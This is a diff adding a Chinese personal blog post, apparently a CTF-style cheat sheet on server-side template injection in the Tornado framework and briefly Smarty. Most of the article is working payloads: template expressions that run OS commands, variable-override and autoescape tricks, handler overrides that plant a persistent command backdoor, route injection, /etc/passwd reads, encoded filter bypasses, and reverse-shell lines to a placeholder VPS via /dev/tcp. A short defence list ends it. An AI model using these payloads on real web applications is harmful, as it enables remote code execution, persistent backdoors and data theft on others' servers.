@@ -1,0 +1,344 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8" />
+    <title>SSTI其他框架 | BAO.的个人博客</title>
+    <meta name="author" content="BAO." />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"
+    />
+    <link rel="icon" href="/images/BAO.jpg" />
+    <link rel="preconnect" href="https://s4.zstatic.net" />
+<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.googleapis.cn" />
+<link rel="preconnect" href="https://fonts.gstatic.cn" crossorigin />
+<link
+    rel="stylesheet"
+    href="https://fonts.googleapis.cn/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap"
+/>
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.alicdn.com/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css" />
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>BAO.的个人博客</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;BAO.的个人博客</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1>SSTI其他框架</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2025/5/28
+        </span>
+        
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <h1 id="Tornado框架SSTI漏洞深度解析"><a href="#Tornado框架SSTI漏洞深度解析" class="headerlink" title="Tornado框架SSTI漏洞深度解析"></a>Tornado框架SSTI漏洞深度解析</h1><span id="more"></span>
+<h2 id="框架概述"><a href="#框架概述" class="headerlink" title="框架概述"></a>框架概述</h2><p>Tornado框架也被称为龙卷风框架，是另一个基于 Python 的开源 Web 框架和异步网络库。它被设计用于构建高性能、可扩展的网络应用程序。Tornado 的核心特性是异步非阻塞的 I&#x2F;O 操作，利用事件循环来实现高效的并发处理。<br>Tornado（龙卷风框架）是基于Python的高性能异步Web框架，核心特性：</p>
+<ul>
+<li>异步非阻塞I&#x2F;O模型</li>
+<li>事件循环并发处理</li>
+<li>支持长轮询和WebSocket</li>
+</ul>
+<h2 id="SSTI漏洞原理"><a href="#SSTI漏洞原理" class="headerlink" title="SSTI漏洞原理"></a>SSTI漏洞原理</h2><p>当使用动态渲染方法时存在注入风险，典型漏洞代码示例：</p>
+<pre><code class="language-python">data = self.get_argument(&quot;ssti&quot;)    
+with open(&#39;1.html&#39;, &#39;w&#39;) as f:
+    f.write(f&quot;&#123;data&#125;&quot;)  # 直接拼接用户输入
+    f.flush()
+self.render(&#39;1.html&#39;)
+</code></pre>
+<h2 id="通用攻击手法"><a href="#通用攻击手法" class="headerlink" title="通用攻击手法"></a>通用攻击手法</h2><p>Tornado既然是基于Python的一门开发框架，所以基于Python语言的SSTI注入都是适用的，比如</p>
+<pre><code class="language-python">&#123;&#123; __import__("os").system("whoami") &#125;&#125;
+&#123;% raw __import__("os").system("whoami") %&#125;
+&#123;&#123;eval('__import__("os").popen("ls").read()')&#125;&#125;
+&#123;&#123;"".__class__.__mro__[-1].__subclasses__()[133].__init__.__globals__["popen"]('ls').read()&#125;&#125;
+&#123;&#123;"".__class__.__mro__[-1].__subclasses__()[x].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('ls').read()")&#125;&#125;
+# 等等
+</code></pre>
+<p>这段代码可以将模板中的变量和表达式转化为Python代码并执行，而在代码中可以发现_tt_utf8(_tt_tmp) 类似的拼接形式，加入我们可以控制两个变量，就存在命令执行的效果，_tt_tmp是用于存储模板中的表达式的，因此我们可以通过set方法将_tt_utf8设置为命令执行的函数，后传入命令执行的表达式进行shell。</p>
+<pre><code class="language-python">&#123;% set _tt_utf8 = __import__("os").system %&#125;&#123;&#123;"whoami"&#125;&#125;
+
+&#123;% raw "__import__('os').popen('ls').read()"%0a    _tt_utf8 = eval%&#125;&#123;&#123;'1'%0a    _tt_utf8 = str&#125;&#125;
+
+&#123;% set _tt_utf8 =eval %&#125;&#123;% raw '__import__('os').popen("bash -c 'bash -i >%26 /dev/tcp/vps-ip/port <%261'")' %&#125;
+</code></pre>
+<h2 id="Tornado-template特性利用"><a href="#Tornado-template特性利用" class="headerlink" title="Tornado.template特性利用"></a>Tornado.template特性利用</h2><h3 id="tt-execute函数分析"><a href="#tt-execute函数分析" class="headerlink" title="_tt_execute函数分析"></a>_tt_execute函数分析</h3><pre><code class="language-python">def _tt_execute():
+    _tt_buffer = []
+    _tt_append = _tt_buffer.append 
+    _tt_tmp = print(__loader__.get_source(1)) 
+    if isinstance(_tt_tmp, _tt_string_types): 
+        _tt_tmp = _tt_utf8(_tt_tmp)  # 关键控制点
+    else: 
+        _tt_tmp = _tt_utf8(str(_tt_tmp)) 
+    _tt_append(_tt_tmp)
+    return _tt_utf8(&#39;&#39;).join(_tt_buffer)
+</code></pre>
+<h3 id="变量覆盖Payload"><a href="#变量覆盖Payload" class="headerlink" title="变量覆盖Payload"></a>变量覆盖Payload</h3><pre><code class="language-python">&#123;% set _tt_utf8 = __import__("os").system %&#125;&#123;&#123;"whoami"&#125;&#125;
+&#123;% raw "__import__('os').popen('ls').read()"%0a    _tt_utf8 = eval%&#125;&#123;&#123;'1'%0a    _tt_utf8 = str&#125;&#125;
+</code></pre>
+<h2 id="Request对象利用"><a href="#Request对象利用" class="headerlink" title="Request对象利用"></a>Request对象利用</h2><p>这个request特性与flask的特性是一样的，用于存储请求的各种方法、变量等，可以使用它的特性绕过不少的东西。</p>
+<h3 id="属性功能"><a href="#属性功能" class="headerlink" title="属性功能"></a>属性功能</h3><pre><code class="language-python">request.method: 获取 HTTP 请求的方法，如 GET、POST、PUT、DELETE 等。
+request.uri: 获取完整的请求 URI，包括路径、查询参数和锚点。
+request.path: 获取请求的路径部分，不包括查询参数和锚点。
+request.query: 获取请求的查询参数部分，以字典形式返回。
+request.body: 获取请求的主体内容，通常用于 POST、PUT 请求。
+request.headers: 获取请求的 HTTP 头部，以字典形式返回。
+request.cookies: 获取请求中的所有 Cookie，以字典形式返回
+</code></pre>
+<h3 id="绕过技巧"><a href="#绕过技巧" class="headerlink" title="绕过技巧"></a>绕过技巧</h3><p>比如说以上的过滤了() __等，可以通过request接收绕过，当然同样也是接受进制绕过的：</p>
+<pre><code class="language-python">&#123;% set _tt_utf8 =eval %&#125;&#123;% raw request.body_arguments[request.method][0] %&#125;
+&amp;POST=__import__(&#39;os&#39;).popen(&quot;bash -i &gt;%26 /dev/tcp/vps/port&quot;)
+
+&#123;% raw "\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28...%22%29"%0a _tt_utf8 = eval%&#125;
+&#123;%raw request.connection.write(("HTTP/1.1 200 OK\r\nCMD: "+__import__("os").popen("id").read()).encode()+b"hacked: ")%&#125;&#39;# 构造了一个 HTTP 响应头部，其中包含了一个 CMD 字段，该字段的值为执行命令的结果。最后，将构造好的响应头部字符串通过 request.connection.write() 方法写入 HTTP 响应中。
+</code></pre>
+<h2 id="Handler组件利用"><a href="#Handler组件利用" class="headerlink" title="Handler组件利用"></a>Handler组件利用</h2><h3 id="敏感信息获取"><a href="#敏感信息获取" class="headerlink" title="敏感信息获取"></a>敏感信息获取</h3><pre><code class="language-python">handler.application            # 获取Tornado实例
+handler.application.add_handlers  # 增加服务处理逻辑
+handler.application.settings   # 查看配置信息
+handler.prepare()              # 请求预处理方法
+</code></pre>
+<h3 id="专用Payload"><a href="#专用Payload" class="headerlink" title="专用Payload"></a>专用Payload</h3><pre><code class="language-python">1、读文件
+&#123;% extends "/etc/passwd" %&#125;
+&#123;% include "/etc/passwd" %&#125;
+2、利用tornado特有的对象或者方法
+&#123;&#123;handler.__init__.__globals__['__builtins__']['eval']("__import__('os').popen('ls').read()")&#125;&#125;
+&#123;&#123;handler.request.server_connection._serving_future._coro.cr_frame.f_builtins['eval']("__import__('os').popen('ls').read()")&#125;&#125;
+3.request绕过
+&#123;&#123;eval(handler.get_argument(request.method))&#125;&#125;?GET=__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()
+
+4.利用&#123;% autoescape %&#125;
+&#123;% autoescape __import__("os").system %&#125;&#123;&#123;"id"&#125;&#125;
+&#123;% autoescape __import__("os").system("id") %&#125;&#123;&#123;0&#125;&#125;
+&#123;% autoescape (lambda x: __import__("os").popen("id").read()) %&#125;&#123;&#123;0&#125;&#125;
+&#123;% autoescape (lambda: __import__("os").popen("id").read())()) 
+&#123;% autoescape (lambda: __import__("os").popen("id").read())())\n ( %&#125;&#123;&#123;0&#125;&#125;
+                                                                  
+5. 利用while
+&#123;% while __import__("os").system("id") %&#125;&#123;%end%&#125;
+&#123;% while 1: return __import__("os").popen("id").read() #\n while 1\n%&#125;&#123;%end%&#125;
+ 
+6. 通过handler
+&#123;%raw handler.prepare = lambda x: x.write(str(eval(x.get_query_argument("cmd", "id"))))%&#125;
+ 
+&#123;%raw handler.__class__._handle_request_exception=lambda x,y:[x.write((str(eval(x.get_query_argument("cmd","id")))).encode()),x.finish()][0]%&#125; #覆盖异常处理
+ 
+ 
+&#123;&#123;handler.application.default_router.add_rules([["123","os.po"+"pen","a","345"]])&#125;&#125;
+&#123;&#123;handler.application.default_router.named_rules['345'].target('/readflag').read()&#125;&#125;
+</code></pre>
+<h2 id="特殊攻击手法"><a href="#特殊攻击手法" class="headerlink" title="特殊攻击手法"></a>特殊攻击手法</h2><h3 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h3><pre><code class="language-python">&#123;% extends "/etc/passwd" %&#125;
+&#123;% include "/etc/passwd" %&#125;
+</code></pre>
+<h3 id="自动转义绕过"><a href="#自动转义绕过" class="headerlink" title="自动转义绕过"></a>自动转义绕过</h3><pre><code class="language-python">&#123;% autoescape __import__("os").system %&#125;&#123;&#123;"id"&#125;&#125;
+&#123;% autoescape (lambda x: __import__("os").popen("id").read()) %&#125;&#123;&#123;0&#125;&#125;
+</code></pre>
+<h3 id="循环结构利用"><a href="#循环结构利用" class="headerlink" title="循环结构利用"></a>循环结构利用</h3><pre><code class="language-python">&#123;% while __import__("os").system("id") %&#125;&#123;%end%&#125;
+&#123;% while 1: return __import__("os").popen("id").read() %&#125;&#123;%end%&#125;
+</code></pre>
+<h1 id="Smarty"><a href="#Smarty" class="headerlink" title="Smarty"></a>Smarty</h1><pre><code class="language-python">a&#123;*comment*&#125;b #输出ab 确定smarty
+&#123;$smarty.version&#125;  #获取smarty的版本号
+&#123;php&#125;phpinfo();&#123;/php&#125;  #执行相应的php代码
+&#123;literal&#125;alert(&#39;xss&#39;);&#123;/literal&#125;
+&#123;if phpinfo()&#125;&#123;/if&#125;
+</code></pre>
+<h2 id="防御建议"><a href="#防御建议" class="headerlink" title="防御建议"></a>防御建议</h2><ol>
+<li>严格过滤用户输入中的特殊字符（<code>&#123;&#123; &#125;&#125;</code>、<code>&#123;% %&#125;</code>）</li>
+<li>使用静态模板渲染代替动态拼接</li>
+<li>禁用危险的内置方法（eval&#x2F;exec&#x2F;<strong>import</strong>）</li>
+<li>及时更新框架版本</li>
+</ol>
+<h2 id="附录：综合Payload集合"><a href="#附录：综合Payload集合" class="headerlink" title="附录：综合Payload集合"></a>附录：综合Payload集合</h2><pre><code class="language-python"># 配置信息获取
+&#123;&#123;handler.application.settings&#125;&#125;
+
+# 异常处理覆盖
+&#123;%raw handler.__class__._handle_request_exception=lambda x,y:[x.write(str(eval(x.get_query_argument("cmd"))))]%&#125;
+
+# 路由规则注入
+&#123;&#123;handler.application.default_router.add_rules([["123","os.po"+"pen","a","345"]])&#125;&#125;
+&#123;&#123;handler.application.default_router.named_rules['345'].target('/readflag').read()&#125;&#125;
+</code></pre>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2025 BAO.的个人博客
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;BAO.
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    
+    
+
+
+
+
+    
+</body>
+</html>
